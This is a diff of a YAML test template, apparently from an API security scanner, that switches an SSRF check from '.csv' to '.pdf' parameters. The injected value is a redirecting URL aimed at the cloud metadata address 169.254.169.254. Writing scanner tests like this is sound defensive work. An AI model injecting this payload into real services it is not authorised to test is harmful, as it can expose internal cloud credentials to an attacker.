@@ -32,25 +32,25 @@ api_selection_filters:
         for_one:
           value:
             contains_either:
-                - .csv
+                - .pdf
           key:
-            extract: csv_key
+            extract: pdf_key
     - query_param:
         for_one:
           value:
             contains_either:
-                - .csv
+                - .pdf
           key:
-            extract: csv_key
+            extract: pdf_key
 
 execute:
   type: single
   requests:
     - req:
         - modify_query_param:
-            csv_key: https://ssrf.localdomain.pw/pdf-without-body/301-http-169.254.169.254:80-.p.pdf
+            pdf_key: https://ssrf.localdomain.pw/pdf-without-body/301-http-169.254.169.254:80-.p.pdf
         - modify_body_param:
-            csv_key: https://ssrf.localdomain.pw/pdf-without-body/301-http-169.254.169.254:80-.p.pdf
+            pdf_key: https://ssrf.localdomain.pw/pdf-without-body/301-http-169.254.169.254:80-.p.pdf
 
 validate:
   response_code:
